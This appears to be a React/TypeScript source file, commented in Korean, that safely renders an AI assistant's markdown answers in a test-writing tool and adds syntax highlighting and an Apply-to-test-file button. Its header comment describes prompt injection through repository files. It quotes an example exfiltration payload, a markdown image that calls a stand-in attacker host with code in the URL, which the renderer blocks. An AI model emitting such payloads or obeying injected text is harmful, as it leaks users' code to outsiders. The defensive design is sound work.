"use client";

// AI 채팅 답변의 마크다운 렌더링.
//
// react-markdown 을 쓰는 이유: HTML 문자열을 끼워 넣지 않고 React 요소로 만들어서 기본값이
// 안전하다(답변 속 <script> 는 글자로만 보인다). AI 답변은 레포 파일 속 프롬프트 인젝션으로
// 조작될 수 있는 입력이라, 직접 짠 파서보다 "기본이 안전한" 쪽을 골랐다.
//
// 그 위에 우리가 더 막는 것:
// - 이미지: 그리지 않는다. `![](https://공격자?d=코드)` 를 그리면 브라우저가 이미지를 불러오는
//   요청만으로 내용이 밖으로 샌다 — 사용자가 아무것도 누르지 않아도.
// - 원본 HTML: skipHtml 로 버린다. rehype-raw 같은 확장은 넣지 않는다.
// - 링크: http(s) 만 링크로 만들고 새 탭 + noopener noreferrer.

import { memo, useEffect, useMemo, useRef, useState, useTransition } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import type { Monaco } from "@monaco-editor/react";
import { Check, Copy, FileCheck, Loader2 } from "lucide-react";
import { applyTestCode } from "@/app/project/[projectRef]/folder/actions";
import { requestTestApply } from "@/components/generation/test-apply-request";
import { copyAndAnnounce } from "@/components/live-announcer";
import { MONACO_THEME, setupMonaco } from "@/lib/monaco-theme";
import { cn } from "@/lib/utils";

const REMARK_PLUGINS = [remarkGfm];

/** 코드펜스 언어 이름 → Monaco 언어 id. 목록에 없으면 색칠하지 않고 글자 그대로 둔다. */
const FENCE_LANGUAGES: Record<string, string> = {
  ts: "typescript",
  tsx: "typescript",
  typescript: "typescript",
  js: "javascript",
  jsx: "javascript",
  mjs: "javascript",
  cjs: "javascript",
  javascript: "javascript",
  json: "json",
  sh: "shell",
  bash: "shell",
  zsh: "shell",
  shell: "shell",
  py: "python",
  python: "python",
  html: "html",
  css: "css",
  yaml: "yaml",
  yml: "yaml",
  sql: "sql",
  md: "markdown",
  markdown: "markdown",
};

let monacoPromise: Promise<Monaco> | null = null;

/**
 * 색칠용 Monaco. 폴더 화면은 파일 보기에서 이미 Monaco 를 불러오므로 거의 공짜다.
 * setTheme 까지 해야 색 클래스(.mtkN) 스타일이 문서에 들어간다 — 에디터가 아직 안 떴어도
 * 코드블록이 색을 갖게. 실패하면 다음에 다시 시도하도록 캐시를 비운다.
 */
function loadMonaco(): Promise<Monaco> {
  monacoPromise ??= import("@monaco-editor/react")
    .then(({ loader }) => loader.init())
    .then((monaco) => {
      setupMonaco(monaco);
      monaco.editor.setTheme(MONACO_THEME);
      return monaco;
    })
    .catch((error: unknown) => {
      monacoPromise = null;
      throw error;
    });
  return monacoPromise;
}

/**
 * Apply 대상. 답변이 나온 파일(메시지의 filePath)이지 지금 열어 둔 파일이 아니다.
 *
 * where 는 누른 결과다. "version" = 새 버전으로 저장(보기 모드), "after" = 수정 모드의
 * After 칸에 꽂기만 하고 저장은 사용자가 Save 로 한다.
 */
type ApplyTarget = {
  projectRef: string;
  filePath: string;
  where: "version" | "after";
  /** 이 파일에 지금 저장돼 있는 테스트 코드. 같으면 Apply 를 막는다. 모르면 null. */
  appliedCode: string | null;
};

/** 테스트 파일로 저장할 수 있는 코드펜스. 셸 명령·JSON 같은 블록엔 Apply 를 달지 않는다. */
const isTestCode = (languageId: string | undefined) =>
  languageId === "typescript" || languageId === "javascript";

function ApplyButton({ code, target }: { code: string; target: ApplyTarget }) {
  const [pending, startTransition] = useTransition();
  // 연타 막기. disabled 는 state 라 리렌더 뒤에야 걸리는데, 저장은 서버 왕복이라 그 사이
  // 두 번 눌리면 둘 다 같은 버전을 읽고 같은 내용이 두 번 쌓인다(서버 가드도 못 잡는다).
  const firing = useRef(false);
  const [clicked, setClicked] = useState<"idle" | "applied" | "failed">("idle");
  const name = target.filePath.split("/").pop() ?? target.filePath;
  // 이 코드가 이미 저장된 테스트 그대로면 누른 적 없어도 "적용됨"이다 — 새로고침이나
  // 보기 ↔ 수정 전환으로 clicked 가 초기화돼도 화면이 사실과 어긋나지 않게.
  const state = clicked === "idle" && target.appliedCode === code ? "applied" : clicked;

  const apply = () => {
    // 버튼은 포커스를 지키려고 disabled 대신 aria-disabled 라, 막는 건 여기서 한다.
    if (firing.current || state === "applied") return;
    firing.current = true;
    // 수정 모드에선 저장하지 않는다 — After 칸을 채울 뿐이라 실패할 일도, 기다릴 일도 없다.
    // 잘못 눌렀으면 에디터에서 ⌘Z 로 되돌아간다(값 교체가 undo 스택에 쌓인다).
    if (target.where === "after") {
      requestTestApply(target.filePath, code);
      setClicked("applied");
      return;
    }
    startTransition(async () => {
      try {
        const result = await applyTestCode(target.projectRef, target.filePath, code);
        setClicked(result.ok ? "applied" : "failed");
        // 실패는 Retry 로 다시 누를 수 있어야 한다.
        if (!result.ok) firing.current = false;
      } catch {
        setClicked("failed");
        firing.current = false;
      }
    });
  };

  return (
    <button
      type="button"
      onClick={apply}
      // 적용 뒤엔 막는다 — 다시 누르면 같은 내용이 새 버전으로 또 쌓인다.
      aria-disabled={pending || state === "applied"}
      title={
        target.where === "after"
          ? `Put this code in the After editor for ${target.filePath}`
          : `Save as a new version of the test for ${target.filePath}`
      }
      // 브랜드 컬러 캡슐. 적용 뒤엔 색을 빼 "끝남"을 보이고, 실패는 테두리만 빨갛게.
      className={cn(
        "flex max-w-full min-w-0 items-center gap-2 rounded-full px-5 py-2.5 text-sm font-medium shadow-sm transition-[background-color,transform] active:scale-[0.97]",
        state === "applied"
          ? "bg-muted text-muted-foreground shadow-none"
          : state === "failed"
            ? "border-destructive text-destructive hover:bg-destructive/10 border"
            : "bg-primary text-primary-foreground hover:bg-primary-hover aria-disabled:opacity-70"
      )}
    >
      {pending ? (
        <Loader2 className="size-4 animate-spin" />
      ) : state === "applied" ? (
        <Check className="size-4" />
      ) : (
        <FileCheck className="size-4 shrink-0" />
      )}
      {/* 파일명이 길면 줄이지 않고 말줄임 — 전체 경로는 title 에 있다. */}
      <span className="truncate">
        {state === "applied"
          ? target.where === "after"
            ? "Put in After"
            : "Applied"
          : state === "failed"
            ? "Apply failed · Retry"
            : target.where === "after"
              ? "Put in After"
              : `Apply to ${name}`}
      </span>
    </button>
  );
}

function CodeBlock({
  code,
  lang,
  streaming,
  applyTo,
}: {
  code: string;
  lang?: string;
  streaming: boolean;
  applyTo: ApplyTarget | null;
}) {
  const [html, setHtml] = useState<{ code: string; value: string } | null>(null);
  const [copied, setCopied] = useState(false);
  const languageId = lang ? FENCE_LANGUAGES[lang.toLowerCase()] : undefined;

  // 색칠은 스트리밍이 끝난 뒤 한 번만. 글자마다 하면 조각이 올 때마다 Monaco 토크나이저를 돈다.
  useEffect(() => {
    if (streaming || !languageId) return;
    let cancelled = false;
    loadMonaco()
      .then((monaco) => monaco.editor.colorize(code, languageId, { tabSize: 2 }))
      .then((value) => {
        if (!cancelled) setHtml({ code, value });
      })
      .catch(() => {
        /* 색칠 실패는 글자 그대로 보여주면 된다 */
      });
    return () => {
      cancelled = true;
    };
  }, [code, languageId, streaming]);

  useEffect(() => {
    if (!copied) return;
    const timer = setTimeout(() => setCopied(false), 1500);
    return () => clearTimeout(timer);
  }, [copied]);

  // 색칠 결과가 지금 코드의 것일 때만 쓴다(스트리밍 중에 옛 결과가 남지 않게).
  const colored = !streaming && html?.code === code ? html.value : null;

  return (
    <>
      <div className="border-border my-2 overflow-hidden rounded-lg border bg-black">
        <div className="border-border text-muted-foreground flex h-7 items-center justify-between border-b pr-1 pl-2.5 text-xs">
          <span className="font-mono">{lang || "code"}</span>
          <button
            type="button"
            onClick={() => {
              void copyAndAnnounce(code).then((ok) => ok && setCopied(true));
            }}
            className="hover:text-foreground hover:bg-muted flex items-center gap-1 rounded px-1.5 py-0.5 transition-colors"
          >
            {copied ? <Check className="size-3.5" /> : <Copy className="size-3.5" />}
            {copied ? "Copied" : "Copy"}
          </button>
        </div>
        {/* 코드는 줄바꿈하지 않고 이 블록 안에서만 가로 스크롤 — 들여쓰기가 무너지지 않게. */}
        <pre className="overflow-x-auto p-3 font-mono text-xs leading-relaxed">
          {colored ? (
            // Monaco colorize 는 토큰 글자를 이스케이프한 <span> 만 돌려준다. 답변 원문을 HTML 로
            // 넣는 게 아니라 Monaco 가 만든 색 마크업만 넣는다.
            <code dangerouslySetInnerHTML={{ __html: colored }} />
          ) : (
            <code>{code}</code>
          )}
        </pre>
      </div>
      {/* 코드블록 밖의 독립 버튼. 긴 코드가 스트리밍되는 동안 헤더는 화면 위로 지나가므로, 다 읽은
        자리(블록 아래)에 끝난 뒤에만 아래에서 올라오게 한다. 채팅은 끝날 때 맨 아래로 스크롤한다. */}
      {applyTo && !streaming && isTestCode(languageId) && (
        <div className="animate-in fade-in slide-in-from-bottom-3 mt-4 mb-4 flex justify-center duration-300 ease-out motion-reduce:animate-none">
          <ApplyButton code={code} target={applyTo} />
        </div>
      )}
    </>
  );
}

const isSafeHref = (href: string | undefined): href is string =>
  !!href && /^https?:\/\//i.test(href);

function buildComponents(streaming: boolean, applyTo: ApplyTarget | null): Components {
  return {
    p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
    h1: ({ children }) => (
      <h3 className="mt-4 mb-2 text-base font-semibold first:mt-0">{children}</h3>
    ),
    h2: ({ children }) => (
      <h3 className="mt-4 mb-2 text-base font-semibold first:mt-0">{children}</h3>
    ),
    h3: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    h4: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    h5: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    h6: ({ children }) => (
      <h4 className="mt-3 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>
    ),
    ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
    ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
    blockquote: ({ children }) => (
      <blockquote className="border-border text-muted-foreground my-2 border-l-2 pl-3">
        {children}
      </blockquote>
    ),
    hr: () => <hr className="border-border my-4" />,
    a: ({ href, children }) =>
      isSafeHref(href) ? (
        <a
          href={href}
          target="_blank"
          rel="noopener noreferrer"
          className="text-brand-cobalt underline underline-offset-2"
        >
          {children}
        </a>
      ) : (
        <span>{children}</span>
      ),
    img: ({ alt }) => <span className="text-muted-foreground">[Image{alt ? `: ${alt}` : ""}]</span>,
    table: ({ children }) => (
      <div className="my-2 overflow-x-auto">
        <table className="w-full border-collapse text-xs">{children}</table>
      </div>
    ),
    th: ({ children }) => (
      <th className="border-border bg-muted border px-2 py-1 text-left font-semibold">
        {children}
      </th>
    ),
    td: ({ children }) => <td className="border-border border px-2 py-1">{children}</td>,
    // 코드펜스는 <pre><code> 로 온다. 틀은 CodeBlock 이 그리므로 pre 는 벗긴다.
    pre: ({ children }) => <>{children}</>,
    code: ({ className, children }) => {
      const text = String(children ?? "");
      const lang = /language-(\S+)/.exec(className ?? "")?.[1];
      // 언어 표시가 있거나 여러 줄이면 코드펜스, 아니면 문장 속 인라인 코드.
      if (!lang && !text.includes("\n")) {
        return (
          <code className="bg-muted rounded px-1 py-0.5 font-mono text-[0.85em]">{children}</code>
        );
      }
      return (
        <CodeBlock
          code={text.replace(/\n$/, "")}
          lang={lang}
          streaming={streaming}
          applyTo={applyTo}
        />
      );
    },
  };
}

/** AI 답변 한 개. streaming 이면 코드 색칠을 미룬다. */
export const ChatMarkdown = memo(function ChatMarkdown({
  text,
  streaming,
  projectRef,
  applyFile,
  applyWhere = "version",
  appliedCode = null,
}: {
  text: string;
  streaming: boolean;
  projectRef: string;
  /** 이 답이 나온 파일. 있으면 테스트 코드블록에 Apply 가 붙는다. */
  applyFile: string | null;
  /** 누르면 새 버전으로 저장할지, 수정 모드의 After 칸에 꽂을지. */
  applyWhere?: ApplyTarget["where"];
  /** 그 파일에 지금 저장돼 있는 테스트 코드. 같은 코드블록의 Apply 는 막힌다. */
  appliedCode?: string | null;
}) {
  const components = useMemo(
    () =>
      buildComponents(
        streaming,
        applyFile ? { projectRef, filePath: applyFile, where: applyWhere, appliedCode } : null
      ),
    [streaming, projectRef, applyFile, applyWhere, appliedCode]
  );
  return (
    <div className="wrap-break-word">
      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} skipHtml components={components}>
        {text}
      </ReactMarkdown>
    </div>
  );
});
